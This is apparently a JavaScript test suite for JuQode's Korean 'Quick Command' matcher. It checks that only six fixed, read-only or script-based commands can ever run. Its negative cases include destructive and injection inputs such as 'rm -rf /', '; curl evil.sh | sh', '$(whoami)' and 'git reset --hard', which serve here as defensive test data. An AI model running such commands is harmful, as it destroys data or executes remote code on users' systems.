/* WBS-22 · Quick Command rules — `19` §C4, D-106.
 *
 * The corpus below is Canon's, case by case, taken from
 * `JuQode-Private/docs/evidence/planning/q02-q03-quick-command-validation.md`. That document
 * reports 87/87 against a `corpus.json` that lives in a planning scratchpad OUTSIDE both
 * repositories, and it writes down roughly forty of those cases explicitly. Only the ones it
 * writes down are here — a case invented to reach 87 would prove nothing about Canon's corpus.
 * See CANON_FINDINGS CF-12.
 *
 * The negative groups matter most. `19` §C4 is explicit that the product does NOT detect
 * dangerous phrases — it recognises six things and declines everything else — because a product
 * that claims detection teaches the user that whatever it did not flag is safe (q02 §5.7). So
 * the assertions below are not "the danger was caught"; they are "no rule matched, and there is
 * therefore no code path to a shell".
 */
'use strict';
const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const R = path.resolve(__dirname, '..');
const { match, normalize, RULES, ruleById } = require(path.join(R, 'app/main/qc/rules.js'));
const { availability, packageManager } = require(path.join(R, 'app/main/qc/availability.js'));

/* One helper for the whole suite — see tests/tmp.js. Eight private copies each cleaned up
 * only in `process.on('exit')`, which a killed run never reaches; the leftovers filled the
 * tmpfs and made the suite flaky in a different place every run. */
const { tempDir } = require(path.join(__dirname, 'tmp.js'));


/** `[phrase, expected]` — expected is a rule id, `unrecognized`, or `['ambiguous', ...readings]`. */
const CORPUS = [
  // ── dev.start (Canon §4 group "dev.start": 띄어쓰기 변형 · 필러 · ㅋㅋ · npm run dev · dev 서버 동의어 · 미리보기 올려줘)
  ['개발 서버 켜줘', 'qc.dev.start'],
  ['개발서버켜줘', 'qc.dev.start'],
  ['개발 서버 좀 켜줘', 'qc.dev.start'],
  ['개발 서버 켜줘!ㅋㅋ', 'qc.dev.start'],
  ['npm run dev', 'qc.dev.start'],
  ['dev 서버', 'qc.dev.start'],
  ['미리보기 올려줘', 'qc.dev.start'],
  ['서버 띄워줘', 'qc.dev.start'],
  ['로컬서버 실행해줘', 'qc.dev.start'],

  // ── dev.stop (Canon: `stop` 동의어 포함)
  ['개발 서버 꺼줘', 'qc.dev.stop'],
  ['서버 멈춰줘', 'qc.dev.stop'],
  ['개발서버 종료해줘', 'qc.dev.stop'],

  // ── build (Canon: `빌드` 단독 · `build 돌려줘` · `npm run build`)
  ['빌드', 'qc.build'],
  ['build 돌려줘', 'qc.build'],
  ['npm run build', 'qc.build'],
  ['빌드 해줘', 'qc.build'],
  ['빌드 한번 돌려봐', 'qc.build'],

  // ── test (Canon: `유닛 테스트 한번 돌려봐` · `test 실행` · `npm test`)
  ['유닛 테스트 한번 돌려봐', 'qc.test'],
  ['test 실행', 'qc.test'],
  ['npm test', 'qc.test'],
  ['테스트 돌려줘', 'qc.test'],
  ['단위테스트 실행해줘', 'qc.test'],

  // ── git.status (Canon: `뭐가 바뀌었어?` · `수정된 파일 확인해줘` — 수정 이 대상어 안에 있어도 잔여물 0)
  ['뭐가 바뀌었어?', 'qc.git.status'],
  ['수정된 파일 확인해줘', 'qc.git.status'],
  ['깃상태', 'qc.git.status'],
  ['git status', 'qc.git.status'],
  ['바뀐 파일 보여줘', 'qc.git.status'],
  ['변경사항', 'qc.git.status'],

  // ── terminal (Canon: `콘솔 열어` · `셸 열어주세요` · `open terminal`)
  ['콘솔 열어', 'qc.terminal.open'],
  ['셸 열어주세요', 'qc.terminal.open'],
  ['open terminal', 'qc.terminal.open'],
  ['터미널 띄워줘', 'qc.terminal.open'],

  // ── ambiguous (Canon §3 — the readings are DETERMINED, and nothing runs)
  ['서버 좀 정리해줘', ['ambiguous', 'qc.dev.stop', 'work']],
  ['서버 치워줘', ['ambiguous', 'qc.dev.stop', 'work']],
  ['개발 서버 정리', ['ambiguous', 'qc.dev.stop', 'work']],
  ['꺼줘', ['ambiguous', 'qc.dev.stop', 'work']],

  // ── negative.change — 변경 동사가 있으면 QC 가 아니다
  ['파일 고쳐줘', 'unrecognized'],
  ['테스트 추가해줘', 'unrecognized'],
  ['빌드 에러 수정해줘', 'unrecognized'],
  ['package.json 에 dev 추가해줘', 'unrecognized'],

  // ── negative.danger — 자유 문장에서 셸로 가는 코드 경로가 없다
  ['rm -rf 해줘', 'unrecognized'],
  ['전부 지워줘', 'unrecognized'],
  ['node_modules 삭제해줘', 'unrecognized'],
  ['git push --force', 'unrecognized'],
  ['git reset --hard 해줘', 'unrecognized'],
  ['서버 켜줘 && rm -rf /', 'unrecognized'],
  ['sudo npm run dev', 'unrecognized'],
  ['커밋해줘', 'unrecognized'],

  // ── negative.other
  ['배포해줘', 'unrecognized'],
  ['서버 켜고 빌드도 해줘', 'unrecognized'],
  ['서버 다시 켜줘', 'unrecognized'],        // 재시작은 MVP 아님
  ['', 'unrecognized'],
  ['웹서버 켜줘', 'unrecognized'],
  ['npm install', 'unrecognized'],

  // ── Canon's out-of-corpus probes (§4, documented explicitly as expected outcomes)
  ['테스트 서버 켜줘', 'unrecognized'],       // 두 규칙 대상어 충돌 → 어느 쪽도 residue 0 아님
  ['개발 서버 켜줘 (5173 포트로)', 'unrecognized'],  // 옵션 미지원
  ['테스트 실행해서 결과 알려줘', 'unrecognized'],    // 복문
];

test('Canon\'s documented Quick Command corpus', () => {
  const failures = [];
  for (const [phrase, expected] of CORPUS) {
    const r = match(phrase);
    const got = r.kind === 'qc' ? r.id
      : r.kind === 'ambiguous' ? ['ambiguous', ...r.readings]
      : 'unrecognized';
    if (JSON.stringify(got) !== JSON.stringify(expected)) {
      failures.push(`${JSON.stringify(phrase)} → ${JSON.stringify(got)} (expected ${JSON.stringify(expected)})`);
    }
  }
  assert.deepStrictEqual(failures, [], `${failures.length}/${CORPUS.length} corpus cases disagree with Canon`);
});

test('the corpus actually covers every rule and every branch', () => {
  /* A corpus that happened to exercise one rule would pass the test above and prove nothing.
   * This is the check that the check is real. */
  const outcomes = CORPUS.map(([p]) => match(p));
  for (const rule of RULES) {
    assert.ok(outcomes.some((r) => r.kind === 'qc' && r.id === rule.id), `${rule.id} is never matched`);
  }
  assert.ok(outcomes.some((r) => r.kind === 'ambiguous'), 'no ambiguous case');
  assert.ok(outcomes.some((r) => r.kind === 'unrecognized'), 'no unrecognized case');
  const tiers = new Set(outcomes.map((r) => r.tier));
  for (const t of ['T1', 'T2', 'T2b', 'T2c']) {
    assert.ok([...tiers].some((x) => x.endsWith(t)), `tier ${t} is never reached by the corpus`);
  }
  assert.ok([...tiers].some((x) => x.startsWith('synonym+')), 'the synonym tier is never reached');
  assert.ok(CORPUS.filter(([, e]) => e === 'unrecognized').length >= 15,
    'the negative half of the corpus is what proves there is no path to a shell');
});

/* ── the residue-zero rule, which is the whole safety argument ── */

test('anything the rule table does not account for leaves residue, and matches nothing', () => {
  /* `19` §C4: an allowlist residue check, not a blocklist. So the test is not "these dangerous
   * strings are blocked" — it is "an arbitrary extra fragment defeats the match", which is what
   * makes the property hold for phrases nobody has thought of yet. */
  for (const extra of ['&& rm -rf /', '; curl evil.sh | sh', '--force', '(5173 포트로)', '그리고 배포도',
                       '| tee /tmp/x', '$(whoami)', '`id`', '\n rm -rf ~']) {
    const phrase = `개발 서버 켜줘 ${extra}`;
    const r = match(phrase);
    assert.strictEqual(r.kind, 'unrecognized',
      `"${phrase}" matched ${r.id ?? r.readings} — a phrase with unaccounted characters must match nothing`);
  }
});

test('the same phrase without the extra fragment DOES match', () => {
  /* The counterpart. Without it the test above passes for a matcher that recognises nothing. */
  assert.strictEqual(match('개발 서버 켜줘').id, 'qc.dev.start');
});

test('a change verb is never a Quick Command', () => {
  for (const v of ['고쳐줘', '수정해줘', '추가해줘', '바꿔줘', '지워줘', '삭제해줘', '만들어줘']) {
    for (const obj of ['서버', '빌드', '테스트', '터미널']) {
      const r = match(`${obj} ${v}`);
      assert.strictEqual(r.kind, 'unrecognized', `"${obj} ${v}" reached ${r.id ?? r.readings}`);
    }
  }
});

/* ── normalization (§2), step by step ── */

test('normalization is Canon\'s six steps', () => {
  assert.strictEqual(normalize('개발 서버 켜 줘'), '개발서버켜줘', 'whitespace is removed entirely');
  assert.strictEqual(normalize('켜줘!ㅋㅋ'), '켜줘', 'punctuation, then the emote tail, then punctuation again');
  assert.strictEqual(normalize('켜줘ㅋㅋ...'), '켜줘');
  assert.strictEqual(normalize('Dev Server'), 'devserver', 'latin lowercases');
  assert.strictEqual(normalize('개발 서버 좀 제발 빨리 켜줘'), '개발서버켜줘', 'fillers are removed');
  assert.strictEqual(normalize('  개발   서버  '), '개발서버');
  assert.strictEqual(normalize(null), '');
  assert.strictEqual(normalize(undefined), '');
});

test('normalization is deterministic and idempotent', () => {
  for (const [phrase] of CORPUS) {
    const once = normalize(phrase);
    assert.strictEqual(normalize(once), once, `${JSON.stringify(phrase)} is not idempotent`);
    assert.strictEqual(normalize(phrase), once);
  }
});

test('NFC: the same word typed decomposed and composed is one word', () => {
  /* Korean typed on some IMEs and pasted from some sources arrives decomposed (NFD). Without
   * step 1 those are different strings and one of them matches nothing. */
  const composed = '개발 서버 켜줘';
  const decomposed = composed.normalize('NFD');
  assert.notStrictEqual(composed, decomposed, 'the fixture must actually differ before normalization');
  assert.strictEqual(normalize(decomposed), normalize(composed));
  assert.strictEqual(match(decomposed).id, 'qc.dev.start');
});

/* ── ambiguity (§3) — nothing runs, and both readings are named ── */

test('a bare verb is ALWAYS ambiguous, never a quiet choice', () => {
  for (const v of ['돌려줘', '켜줘', '꺼줘']) {
    const r = match(v);
    assert.strictEqual(r.kind, 'ambiguous', `"${v}" chose ${r.id} without asking`);
    assert.ok(r.readings.length >= 2, `"${v}" offered ${r.readings.length} reading(s)`);
  }
  assert.deepStrictEqual(match('돌려줘').readings, ['qc.dev.start', 'qc.build', 'qc.test']);
  assert.deepStrictEqual(match('켜줘').readings, ['qc.dev.start', 'qc.terminal.open']);
});

test('a one-candidate bare verb still offers `work` as the other reading', () => {
  /* §3 case B: "1개뿐이면 `[id, work]`". A verb with no object does not name its target, so the
   * product asks rather than guessing — even when only one rule could have meant it. */
  assert.deepStrictEqual(match('꺼줘').readings, ['qc.dev.stop', 'work']);
});

test('정리/치워 is two readings, and the other one is a Work', () => {
  /* §3 case C. "서버를 정리한다" is either stopping the running server or tidying the server
   * CODE — and tidying code changes files, which is a Work, not a Quick Command. */
  const r = match('서버 좀 정리해줘');
  assert.strictEqual(r.kind, 'ambiguous');
  assert.deepStrictEqual(r.readings, ['qc.dev.stop', 'work']);
  /* …and with no Quick Command object at all there is nothing to be ambiguous ABOUT. */
  assert.strictEqual(match('정리해줘').kind, 'unrecognized');
});

/* ── the rule set is closed ── */

test('there are exactly the six rules `20` has a foreign key for', () => {
  const schema = fs.readFileSync(path.join(R, 'app/main/db/schema.sql'), 'utf8');
  /* The statement is one line of `('a'),('b'),…;` — read to the semicolon, not to the first
   * closing paren, or this counts one rule and passes for the wrong reason. */
  const stmt = /insert into quick_command_rule values([^;]*);/.exec(schema);
  assert.ok(stmt, 'the schema no longer seeds quick_command_rule at all');
  const declared = [...stmt[1].matchAll(/'([^']+)'/g)].map((x) => x[1]);
  assert.strictEqual(declared.length, 6, 'the schema no longer declares six rules');
  assert.deepStrictEqual(RULES.map((r) => r.id).sort(), declared.sort(),
    'the rule table and the schema disagree — a seventh rule cannot be added in one place alone');
});

test('no rule is `write` class — `19` §C4 keeps those out of the MVP', () => {
  for (const r of RULES) {
    assert.ok(['read', 'run'].includes(r.risk), `${r.id} is risk=${r.risk}`);
  }
});

test('exactly one rule is long-running, and it names its stop rule', () => {
  const long = RULES.filter((r) => r.kind === 'long_running');
  assert.strictEqual(long.length, 1);
  assert.strictEqual(long[0].id, 'qc.dev.start');
  assert.strictEqual(long[0].stopRule, 'qc.dev.stop');
  assert.ok(ruleById(long[0].stopRule), 'the stop rule it names does not exist');
});

/* ── availability (project_condition) ── */

function project(files = {}) {
  const dir = tempDir('juqode-qc-');
  for (const [rel, body] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    fs.writeFileSync(path.join(dir, rel), body);
  }
  return dir;
}
const pkg = (scripts) => JSON.stringify({ name: 'x', scripts }, null, 2);

test('a project with no package.json says so, and does not invent a command', () => {
  const root = project({});
  for (const id of ['qc.dev.start', 'qc.build', 'qc.test']) {
    const a = availability(id, { root });
    assert.strictEqual(a.available, false);
    assert.strictEqual(a.reason, 'no_package_json');
    assert.ok(!a.data.command, `${id} produced a command anyway: ${a.data.command}`);
  }
});

test('a missing script is `no_script`, never a guessed command', () => {
  const root = project({ 'package.json': pkg({ lint: 'eslint .' }) });
  assert.strictEqual(availability('qc.dev.start', { root }).reason, 'no_script');
  assert.strictEqual(availability('qc.build', { root }).reason, 'no_script');
  assert.strictEqual(availability('qc.test', { root }).reason, 'no_script');
});

test('dev falls back to start, then serve, and says which it chose', () => {
  /* `19` §C4: 어느 것을 골랐는지 설명에 그대로 적는다 — a user whose `start` script does
   * something else entirely has to see that before it runs. */
  const withStart = project({ 'package.json': pkg({ start: 'node server.js' }) });
  const a = availability('qc.dev.start', { root: withStart });
  assert.strictEqual(a.available, true);
  assert.strictEqual(a.data.script, 'start');
  assert.strictEqual(a.data.command, 'npm run start');
  assert.strictEqual(a.data.scriptBody, 'node server.js', 'the actual script body is shown');

  const withServe = project({ 'package.json': pkg({ serve: 'vite preview' }) });
  assert.strictEqual(availability('qc.dev.start', { root: withServe }).data.script, 'serve');

  const withAll = project({ 'package.json': pkg({ dev: 'vite', start: 'node s.js', serve: 'x' }) });
  assert.strictEqual(availability('qc.dev.start', { root: withAll }).data.script, 'dev', 'dev wins');
});

test('npm\'s placeholder test script is 사용 불가, not a run', () => {
  const body = 'echo "Error: no test specified" && exit 1';
  const root = project({ 'package.json': pkg({ test: body }) });
  const a = availability('qc.test', { root });
  assert.strictEqual(a.available, false);
  assert.strictEqual(a.reason, 'placeholder_script');
  assert.strictEqual(a.data.scriptBody, body, 'the user is entitled to see what is in their file');
  assert.ok(!a.data.command, 'the placeholder must not produce a runnable command');
});

test('a real test script runs', () => {
  const root = project({ 'package.json': pkg({ test: 'node --test' }) });
  const a = availability('qc.test', { root });
  assert.strictEqual(a.available, true);
  assert.strictEqual(a.data.command, 'npm run test');
});

test('an already-running dev server is `already_running` with its pid', () => {
  const root = project({ 'package.json': pkg({ dev: 'vite' }) });
  const devServer = { pid: 4242, startedAt: '2026-01-01T00:00:00.000Z', command: 'npm run dev' };
  const a = availability('qc.dev.start', { root, devServer });
  assert.strictEqual(a.reason, 'already_running');
  assert.strictEqual(a.data.pid, 4242);
});

test('stopping a server JuQode did not start is `not_running`', () => {
  /* `19` §C4: JuQode 밖에서 켠 서버는 JuQode 가 끄지 않는다. The handle is the only thing that
   * makes a stop legitimate — signalling a pid nobody recorded is signalling a stranger. */
  const root = project({ 'package.json': pkg({ dev: 'vite' }) });
  assert.strictEqual(availability('qc.dev.stop', { root }).reason, 'not_running');
  const a = availability('qc.dev.stop', { root, devServer: { pid: 4242, startedAt: 't', command: 'npm run dev' } });
  assert.strictEqual(a.available, true);
  assert.strictEqual(a.data.pid, 4242);
});

test('git status needs a git repo, and its command is fixed and read-only', () => {
  const plain = project({ 'package.json': pkg({}) });
  assert.strictEqual(availability('qc.git.status', { root: plain }).reason, 'not_git');

  const repo = project({ 'package.json': pkg({}), '.git/HEAD': 'ref: refs/heads/main\n' });
  const a = availability('qc.git.status', { root: repo });
  assert.strictEqual(a.available, true);
  assert.strictEqual(a.data.command, 'git status --porcelain=v1 --branch',
    'the command is FIXED — nothing the user typed reaches it');
  assert.strictEqual(a.data.readOnly, true);
});

test('the terminal opens with no condition at all', () => {
  /* `19` §C4: 터미널은 package.json 없어도 가능. */
  const a = availability('qc.terminal.open', { root: project({}) });
  assert.strictEqual(a.available, true);
  assert.strictEqual(a.reason, null);
  assert.ok(!a.data.command, 'opening the drawer runs no command');
});

test('the package manager comes from the lockfile', () => {
  assert.strictEqual(packageManager(project({ 'pnpm-lock.yaml': '' })), 'pnpm');
  assert.strictEqual(packageManager(project({ 'yarn.lock': '' })), 'yarn');
  assert.strictEqual(packageManager(project({ 'bun.lockb': '' })), 'bun');
  assert.strictEqual(packageManager(project({ 'package-lock.json': '{}' })), 'npm');
  assert.strictEqual(packageManager(project({})), 'npm', 'no lockfile: npm');

  const root = project({ 'package.json': pkg({ build: 'vite build' }), 'pnpm-lock.yaml': '' });
  assert.strictEqual(availability('qc.build', { root }).data.command, 'pnpm run build');
});

test('a malformed package.json is not a package.json we can use', () => {
  const root = project({ 'package.json': '{ not json' });
  assert.strictEqual(availability('qc.build', { root }).reason, 'no_package_json');
});

test('an id outside the closed set is never available', () => {
  const root = project({ 'package.json': pkg({ build: 'x' }) });
  const a = availability('qc.rm.rf', { root });
  assert.strictEqual(a.available, false);
  assert.strictEqual(a.reason, 'unknown_rule');
});

test('every command that exists comes from the project or is fixed', () => {
  /* The property that matters: no command string is ever assembled from user text. Each one is
   * either `<pm> run <script-name-from-a-closed-list>` or a literal. */
  const root = project({ 'package.json': pkg({ dev: 'vite', build: 'vite build', test: 'node --test' }),
                         '.git/HEAD': 'ref: refs/heads/main\n' });
  const allowed = new Set(['npm run dev', 'npm run build', 'npm run test',
                           'git status --porcelain=v1 --branch']);
  for (const rule of RULES) {
    const a = availability(rule.id, { root });
    if (!a.data.command) continue;
    assert.ok(allowed.has(a.data.command), `${rule.id} produced an unexpected command: ${a.data.command}`);
  }
});
